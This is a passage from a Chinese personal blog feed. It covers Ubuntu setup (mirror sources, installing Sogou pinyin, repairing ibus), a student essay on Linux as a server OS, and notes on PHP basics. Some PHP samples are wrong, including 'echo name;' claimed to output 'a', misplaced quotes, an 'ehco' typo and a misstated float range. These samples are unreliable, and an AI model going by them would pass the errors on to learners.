<li><p>用gedit打开sources.list:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
</li>
<li><p>全选sources.list下内容，复制粘贴下面香港中文大学的更新源，之前我说过163和阿里云都是404，目前香港中文大学的更新源速度还不错。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty main restricted universe multiverse</span><br><span class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-security main restricted universe multiverse</span><br><span class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-updates main restricted universe multiverse</span><br><span class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-backports main restricted universe multiverse</span><br><span class="line">deb http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty main restricted universe multiverse</span><br><span class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-security main restricted universe multiverse</span><br><span class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-updates main restricted universe multiverse</span><br><span class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-backports main restricted universe multiverse</span><br><span class="line">deb-src http://ftp.cuhk.edu.hk/pub/Linux/ubuntu trusty-proposed main restricted universe</span><br></pre></td></tr></table></figure>
</li>
<li><p>刷新列表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
</li>
<li><p>更新软件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get dist-upgrade</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3><span id="安装搜狗输入法">安装搜狗输入法</span></h3><p>在用到火狐浏览器时，发现Ubuntu下的ibus打字法很别扭。于是产生安装搜狗打字法的想法，但是在官方下载搜狗deb安装包，安装完后发现，切换到搜狗打字法时并不能输入中文。之后找到问题的所在，并解决记录下来。</p>
<h4><span id="安装搜狗拼音">安装搜狗拼音</span></h4><p>当前最新版本是sogoupinyin_2.1.0.0082_amd64.deb<a href="http://cdn2.ime.sogou.com/dl/index/1475147394/sogoupinyin_2.1.0.0082_amd64.deb?st=UvO7xZ1Rvw-j5J5UW6D0ZQ&amp;e=1487927618&amp;fn=sogoupinyin_2.1.0.0082_amd64.deb" target="_blank" rel="noopener">下载链接</a><br>可以直接双击安装，也可以在安装包目录下打开终端，执行命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i sogoupinyin_2.1.0.0082_amd64.deb</span><br></pre></td></tr></table></figure>
<h4><span id="卸载ibus">卸载ibus</span></h4><p>安装完成后，点右上角的图标切换到搜狗打字法，会发现并不能输入中文。在网上查询资料得，14.04的思路，不必卸载ibus，直接双击搜狗的deb安装，完成后重启即可。但在14.10版本中这个方法已不适用。所以在这个时候我们需要卸载ibus。</p>
<p>执行命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove ibus</span><br></pre></td></tr></table></figure>
<p>重启计算机或注销后，就可以使用搜狗输入法了。</p>
<h3><span id="修复系统设置">修复系统设置</span></h3><p>由于卸载了ibus，造成系统设置点击无反应，经查询得到方法，几经波折解决之。</p>
<h4><span id="最初修复方案">最初修复方案</span></h4><p>网上给出的答案是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ibus    #此命令安装ibus-gtk，ibus-gtk3  </span><br><span class="line">sudo apt-get install linux-generic     #此命令安装linux-generic  </span><br><span class="line">sudo apt-get install ubuntu-desktop    #此命令修复ubutun桌面</span><br></pre></td></tr></table></figure></p>
<p>但执行第一句命令时出现错误<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">uknow@uknow-ubuntu:~$ sudo apt-get install ibus</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树       </span><br><span class="line">正在读取状态信息... 完成       </span><br><span class="line">有一些软件包无法被安装。如果您用的是 unstable 发行版，这也许是</span><br><span class="line">因为系统无法达到您要求的状态造成的。该版本中可能会有一些您需要的软件</span><br><span class="line">包尚未被创建或是它们已被从新到(Incoming)目录移出。</span><br><span class="line">下列信息可能会对解决问题有所帮助：</span><br><span class="line"></span><br><span class="line">下列软件包有未满足的依赖关系：</span><br><span class="line"> ibus : 依赖: gir1.2-ibus-1.0 (= 1.5.5-1ubuntu3.2) 但是 1.5.8-2ubuntu2 正要被安装</span><br><span class="line">        推荐: ibus-gtk 但是它将不会被安装 或</span><br><span class="line">                ibus-qt4 但是它将不会被安装</span><br><span class="line">E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。</span><br></pre></td></tr></table></figure></p>
<h4><span id="gir12-ibus-10降级">gir1.2-ibus-1.0降级</span></h4><p>按照提示，ibus依赖<em>gir1.2-ibus-1.0 (= 1.5.5-1ubuntu3.2)</em>但是当前版本为 <em>1.5.8-2ubuntu2 </em><br>还需要安装<em>ibus-gtk</em>或者<em>ibus-qt4</em>。<br>这里又需要对<em>gir1.2-ibus-1.0</em>进行<em>降级</em><br>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ibus-gtk</span><br><span class="line">sudo apt-get install gir1.2-ibus-1.0=1.5.5-1ubuntu3.2</span><br></pre></td></tr></table></figure></p>
<h4><span id="最终修复方案">最终修复方案</span></h4><p>最后再按照上面网上给出的方法修复即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ibus    #此命令安装ibus-gtk，ibus-gtk3  </span><br><span class="line">sudo apt-get install linux-generic     #此命令安装linux-generic  </span><br><span class="line">sudo apt-get install ubuntu-desktop    #此命令修复ubutun桌面</span><br></pre></td></tr></table></figure></p>
<p>最后注销或重启计算机，完美修复。</p>
<h3><span id="当前目录打开终端">当前目录打开终端</span></h3><p>对于初学者linux文件目录知识还是有点陌生的，之前我在使用kali linux时右键是可以在当前目录打开终端的，而ubuntu默认右键选项没有这一项。所以安装之。<br>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nautilus-open-terminal			//把终端加到右键菜单</span><br><span class="line">nautilus -q			//重新加载文件夹</span><br></pre></td></tr></table></figure></p>
<h3><span id="sublime-text-3">Sublime Text 3</span></h3><p>Sublime Text是一款很炫酷的编辑器，之前看代码都是用这款。</p>
<p>下载地址：<br><a href="https://pan.baidu.com/s/1miG1YNu" target="_blank" rel="noopener">https://pan.baidu.com/s/1miG1YNu</a></p>
<p>执行命令安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i sublime-text_build-3126_amd64.deb</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux作为服务器操作系统的优势]]></title>
      <url>https://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%80%E5%91%A8-Linux%E4%BD%9C%E4%B8%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E4%BC%98%E5%8A%BF.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>初次在课上听到老师说到，每周需要写博客的作业时。我是很惊讶的，这是第一次在传统的校园课堂拿到一个这么新鲜的作业。这可能就是传统教育与培训教育的不同之处吧。下面是老师留给我们的题目：为什么服务器端的操作系统大多数为Linux？我之前是接触过Linux的，之前用过kali linux，因此在选选修课的时候也就毫不犹豫的选择了Linux基础这门课。检索了别人的文章然后加上自己的想法写下这篇博客。</p>
<h2><span id="正文">正文</span></h2><h3><span id="linux简介">Linux简介</span></h3><p>Linux是一个自由的，免费的，源码开放的操作系统。也是开源软件中最著名的例子。其最主要的目的就是为了建立不受任何商品化软件版权制约的，全世界都能使用的类Unix兼容产品.而我们将服务器部署在Linux将会更加的稳定、安全、高效以及出色的性能这时windows无法比的。</p>
<h3><span id="linux优势">Linux优势</span></h3><h4><span id="费用低">费用低</span></h4><p>费用问题对于一个每一个公司企业是很重的，而服务器的投入是一笔不小的开支，大家都想办法去降低服务器运维和服务器投入的成本问题。而Linux作为一个开源免费的操作系统，无疑得到了大都企业的青睐。企业可以降低更多的服务器成本，以此去填充其他方面的资金不足问题。</p>
<h4><span id="网络功能">网络功能</span></h4><p>Linux内置了很丰富的免费网络服务器软件、数据库和网页的开发工具。如Apache、Sendmail、VSFtp、SSH、MySQL、PHP和JSP等。近年来，越来越多的企业看到了Linux的这些强大的功能，利用Linux担任全方位的网络服务器。</p>
<h4><span id="硬件支持">硬件支持</span></h4><p>由于Linux的内核大部分是用C语言编写的，并采用了可移植的Unix标准应用程序接口，所以它支持如i386、Alpha、AMD和Sparc等系统平台，以及从个人电脑到大型主机，甚至包括嵌入式系统在内的各种硬件设备。</p>
<h4><span id="稳定性">稳定性</span></h4><p>Linux内核的源代码是以标准规范的32位(在64位CPU上是64位)的计算机来做的最佳化设计，可确保其系统的稳定性。正因为Linux的稳定，才使得一些安装Linux的主机像Unix机一样常年不关而不曾宕机。</p>
<h4><span id="安全性">安全性</span></h4><p>对于企业来说数据安全也是很重要的，在近几年企业和管理者都慢慢开始关注信息安全的问题。Linux系统的诞生就是与信息安全有渊源的，Linux之父林纳斯·托瓦兹，本来就是一名著名的黑客。在黑客的世界里，大家都崇尚共享，自由，开源的理念。所以在Linux的更新、漏洞披露和修补大多数是由一些这样的组织在进行的。在这类的努力下，Linux在基础安全和应用安全方面都是比其他系统更加出色的。</p>
<h3><span id="linux有趣命令">Linux有趣命令</span></h3><h4><span id="cmatrix-命令">cmatrix 命令</span></h4><p>之前在《黑客帝国》电源中看到过这类的代码流，感觉很酷。后来在学习中发现了这个命令。在终端执行如下命令即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install cmatrix</span><br><span class="line">$cmatrix</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224155122.jpg" alt="cmatrix"></p>
<h4><span id="sl-命令">sl 命令</span></h4><p>你会看到一辆火车从屏幕右边开往左边。。。。。。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install sl </span><br><span class="line">$ sl</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170224155428.jpg" alt="sl"></p>
<h2><span id="结语">结语</span></h2><p>简单的说了下Linux作为服务器操作系统的优势，部分语言引用网络，望见谅。</p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[《细说PHP》学习笔记]]></title>
      <url>https://uknowsec.cn/posts/notes/%E3%80%8A%E7%BB%86%E8%AF%B4PHP%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/t01db525962d3cb177e.jpg" alt="php"></p>
<h1><span id="php的基本语法">PHP的基本语法</span></h1><h2><span id="php第一个程序">PHP第一个程序</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;</span><br><span class="line">		&lt;title&gt;获取服务器信息的第一个PHP程序&lt;/title&gt;	</span><br><span class="line">	&lt;/head&gt;	</span><br><span class="line">	&lt;body&gt;			</span><br><span class="line">&lt;?php		</span><br><span class="line">	$sysos = $_SERVER[&quot;SERVER_SOFTWARE&quot;];	     //获取服务器标识的字串</span><br><span class="line">	$sysversion = PHP_VERSION;                   //获取PHP服务器版本	</span><br><span class="line"></span><br><span class="line">	//以下两条代码连接MySQL数据库并获取MySQL数据库版本信息</span><br><span class="line">	mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;); 	</span><br><span class="line">	$mysqlinfo = mysql_get_server_info();	</span><br><span class="line"></span><br><span class="line">	//从服务器中获取GD库的信息</span><br><span class="line">	if(function_exists(&quot;gd_info&quot;))&#123;                   </span><br><span class="line">		$gd = gd_info();</span><br><span class="line">		$gdinfo = $gd[&apos;GD Version&apos;];</span><br><span class="line">	&#125;else &#123;</span><br><span class="line">		$gdinfo = &quot;未知&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">        //从GD库中查看是否支持FreeType字体</span><br><span class="line">	$freetype = $gd[&quot;FreeType Support&quot;] ? &quot;支持&quot; : &quot;不支持&quot;;  </span><br><span class="line">	</span><br><span class="line">	//从PHP配置文件中获得是否可以远程文件获取</span><br><span class="line">	$allowurl= ini_get(&quot;allow_url_fopen&quot;) ? &quot;支持&quot; : &quot;不支持&quot;;</span><br><span class="line">	</span><br><span class="line">	//从PHP配置文件中获得最大上传限制</span><br><span class="line">	$max_upload = ini_get(&quot;file_uploads&quot;) ? ini_get(&quot;upload_max_filesize&quot;) : &quot;Disabled&quot;;</span><br><span class="line">	</span><br><span class="line">	//从PHP配置文件中获得脚本的最大执行时间</span><br><span class="line">	$max_ex_time= ini_get(&quot;max_execution_time&quot;).&quot;秒&quot;;</span><br><span class="line"></span><br><span class="line">	//以下两条获取服务器时间，中国大陆采用的是东八区的时间,设置时区写成Etc/GMT-8</span><br><span class="line">	date_default_timezone_set(&quot;Etc/GMT-8&quot;);</span><br><span class="line">	$systemtime = date(&quot;Y-m-d H:i:s&quot;,time());</span><br><span class="line">	</span><br><span class="line">	/*  *******************************************************************  */	</span><br><span class="line">	/*   以HTML表格的形式将以上获取到的服务器信息输出给客户端浏览器          */	</span><br><span class="line">	/*  *******************************************************************  */	</span><br><span class="line">	echo &quot;&lt;table align=center cellspacing=0 cellpadding=0&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;caption&gt; &lt;h2&gt; 系统信息  &lt;/h2&gt; &lt;/caption&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; Web服务器：    &lt;/td&gt; &lt;td&gt; $sysos        &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;tr&gt; &lt;td&gt; PHP版本：      &lt;/td&gt; &lt;td&gt; $sysversion   &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; MySQL版本：    &lt;/td&gt; &lt;td&gt; $mysqlinfo    &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; GD库版本：     &lt;/td&gt; &lt;td&gt; $gdinfo       &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; FreeType：     &lt;/td&gt; &lt;td&gt; $freetype     &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 远程文件获取： &lt;/td&gt; &lt;td&gt; $allowurl     &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 最大上传限制： &lt;/td&gt; &lt;td&gt; $max_upload   &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 最大执行时间： &lt;/td&gt; &lt;td&gt; $max_ex_time  &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;tr&gt; &lt;td&gt; 服务器时间：   &lt;/td&gt; &lt;td&gt; $systemtime   &lt;/td&gt; &lt;/tr&gt;&quot;;</span><br><span class="line">	echo &quot;&lt;/table&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="php语言标记">PHP语言标记</span></h3><h4><span id="php语言嵌入html中的位置">PHP语言嵌入HTML中的位置</span></h4><p>可以将PHP嵌入到以后缀名为.php的HTML文件中的任何地方，只要在文件中使用&lt;?php起始和终止标识符？&gt;就会开启PHP模式</p>
<h4><span id="使用四对不同的开始和结束标记">使用四对不同的开始和结束标记</span></h4><ul>
<li>1.xml风格（标准风格推荐使用）    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">echo&quot;这是xml风格的标记&quot;; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>xml风格的标记是常用的标记，也是推荐使用的标记，服务器不能禁用，该风格的标记在xml，xhtml中都可以使用。</p>
<ul>
<li><p>2.脚本风格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script languange=&quot;php&quot;&gt; </span><br><span class="line">echo&apos;这是脚本风格的标记&apos;; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>3.简短风格</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?这是简短风格的标记;?&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>注：需要在php.ini中设置short _open_tag=on，默认是on,或者在 PHP 编译时加入了 Cenable-short-tags 选项。(PHP 3版本还可以通过 short_tags() 函数激活使用短标记。)</p>
<ul>
<li>4.asp风格<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% </span><br><span class="line">echo&apos;这是asp风格的标记&apos;; </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>注：需要在 php.ini 配置文件中开启 asp_tags = on;<br>上面asp风格与简短风格需要在php.ini中设置下。默认是不支持的。</p>
<h3><span id="指令分隔符-分号">指令分隔符 “分号”</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo &quot;This is a test&quot;;</span><br><span class="line">?&gt;   //这是一个PHP指令，后面一定要加上分号表示结束</span><br><span class="line"></span><br><span class="line">&lt;?php echo &quot;This is a test&quot;</span><br><span class="line">?&gt;  //最后的结束标记?&gt;隐含表示了一个分号，所以这粒可以不用分号结束</span><br></pre></td></tr></table></figure>
<h3><span id="程序注释">程序注释</span></h3><p>  PHP支持C，C++和Unix shell风格的注释，PHP的注释符号有三种：以“/<em>”和“</em>/”闭合的多行注释符，以及用“//”和“#”开始的单行注释符。注释一定要卸载被注释代码的上面或是右面，不要写到代码的下面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	/*这是一个多行注释</span><br><span class="line">	可以有多行文字   */</span><br><span class="line">	</span><br><span class="line">	echo &quot;this is a test&quot;;</span><br><span class="line">	echo &quot;this is another test&quot;;    //这是一行C++风格的注释</span><br><span class="line">	echo &quot;One final test &quot;; 	# 这是Unix Shell风格的注释</span><br></pre></td></tr></table></figure>
<p>注：多行注释是无法嵌套的，但是在多行注释里可以包含单行注释，在单行注释中也可以包括多行注释。</p>
<h2><span id="变量">变量</span></h2><h3><span id="变量的声明">变量的声明</span></h3><p>在PHP中的声明变量必须是使用“$”后面跟上变量名表示，使用赋值操作符（=）给变量赋值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$a=100;		//声明一个变量a赋上一个整型数据值100；</span><br><span class="line">	$b=&quot;string&quot;;   //声明一个变量b赋上一个字符串值“string”</span><br><span class="line">	$c=true;	//声明一个变量c赋上一个布尔数据值</span><br><span class="line">	$d=99.99;	//声明一个变量d赋上一个浮点型数值</span><br><span class="line">	</span><br><span class="line">	$key1=$a;	//声明一个变量key1，将a变量的值赋给它</span><br><span class="line">	$key2=$b;	//声明一个变量key2，将b变量的值赋给它</span><br><span class="line">	</span><br><span class="line">	$a=$b=$c=$d=&quot;value&quot;; 	//同时声明多个变量，并赋上相同的值</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在变量的使用范围周期内，我们可以通过借助unset()函数释放指定的变量，用isset()函数检测变量是否设置和使用empty()函数检查一个变量是否为空。</p>
<h3><span id="变量的命名">变量的命名</span></h3><p>变量名是严格区分大小写的，相同单词组成的变量，但大小写不同就是不同变量。<br>一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字，或者下划线。<br>正则表达式为：‘[a-zA-Z<em>\x7f-\xff][a-zA-Z0-9</em>\x7f-\xff]*’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$name=&quot;a&quot;;</span><br><span class="line">	$Name=&quot;b&quot;;</span><br><span class="line">	$NAME=&quot;c&quot;;</span><br><span class="line">	</span><br><span class="line">	echo name;		//输出 a</span><br><span class="line">	echo Name;		//输出 b</span><br><span class="line">	echo NAME; 	 	//输出 c</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="可变变量">可变变量</span></h3><p>一个变量的变量名可以动态地设置和使用，一个普通的变量通过声明来设置，而一个可变变量获取一个普通变量的值作为这个可变变量的变量名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$hi=&quot;hello;&quot;		//声明一个普通的变量$hi值为“hello”</span><br><span class="line">	$$hi=&quot;world;&quot;   //声明一个可变变量$$hi,$hi的值为hello，相当于声明$hello的值是“world”</span><br><span class="line">	</span><br><span class="line">	ehco &quot;$hi $hello&quot;;  //输出 hello world</span><br><span class="line">	echo &quot;$hi $&#123;$hi&#125;&quot;;	//同上</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="变量的引用赋值">变量的引用赋值</span></h3><p>新的变量简单的引用了原始变量，改动新的变量将影响到原始变量，反之亦然。使用引用复制，简单地将一个“&amp;”符号加到将要赋值的变量前。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$foo=&apos;Bob&apos;;</span><br><span class="line">	$bar=&amp;$foo;</span><br><span class="line">	</span><br><span class="line">	$bar=&apos;a&apos;;</span><br><span class="line">	echo $bar;     //a</span><br><span class="line">	echo $foo;		//a</span><br><span class="line">	</span><br><span class="line">	$foo=&apos;b&apos;;</span><br><span class="line">	echo $bar;   //b</span><br><span class="line">	echo $foo;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="变量的类型">变量的类型</span></h2><h3><span id="数据类型">数据类型</span></h3><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E6%88%AA%E5%9B%BE20170115191035.jpg" alt=""><br>可以使用函数var_dump()查看某表达式的值和类型。</p>
<h3><span id="布尔型boolean">布尔型（boolean）</span></h3><p>以下值被认为是FALSE，所有其他值都被认为是TRUE（包括任何资源）。</p>
<ul>
<li>布尔值FALSE</li>
<li>整型值0为假，-1和其他非零值一样，被认为TRUE</li>
<li>浮点型值0.0</li>
<li>空白字符串和字符串“0”</li>
<li>没有成员变量的数组</li>
<li>没有单元的对象（仅适用与PHP4）</li>
<li>特殊类型NULL（包括尚未设定的变量）</li>
</ul>
<h3><span id="整型integer">整型（integer）</span></h3><p>整数数值有最大的使用范围，整型数的字长和平台有关，如果给定的一个数超出了integer的这个范围，将会被解释为float。同时如果执行的运算结果超出了integer这个范围，也会返回float.</p>
<h3><span id="浮点型float">浮点型（float）</span></h3><p>浮点数的字长也是和平台相关，允许表示范围在1.7E-308-1.7E+38之间，精确到小数点后15位。不要比较两个浮点数是否相等。如果确实需要更高的精度，应该是使用任意精度数学函数或者gmp()函数。</p>
<h3><span id="字符串string">字符串（string）</span></h3><p>字符串可以使用单引号、双引号、界定符三种字面上的方法定义。</p>
<ul>
<li>1.单引号：指定一个简单字符串的最简单的方法就是用单引号括起来。</li>
<li>2.双引号：更多的特殊字符的转义，可以解析双引号里面的包含变量。</li>
<li>3.界定符（&lt;&lt;&lt;）：在&lt;&lt;&lt;之后提供一个标识符开始，然后是包含的字符串，最后是同样的标识符结束。结束标识符必须从行的第一列开始，并且后面除了分号以外不能包含任何其他的字符，空格以及空白制表符都不可以。</li>
</ul>
<h3><span id="数组array">数组（array）</span></h3><p>用array()语言结构来新建一个array,它接受一定数量用逗号分隔的key=&gt;value参数对。<br>key 可以是integer或者string value可以是任何值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$arr=array(&quot;foo&quot;=&gt;&quot;bar&quot;,12=&gt;true);   </span><br><span class="line">	print_r($arr);		//使用print_r()函数查看数组中的全部内容</span><br><span class="line">	echo $arr[&quot;foo&quot;];	//通过数组下标访问数组中的单个数据</span><br><span class="line">	echo $arr[12];		</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="对象object">对象（object）</span></h3><p>一个对象类型的变量，是由一组属性值和一组方法构成的。要初始化一个对象，用new语句将对象实例到一个变量中。</p>
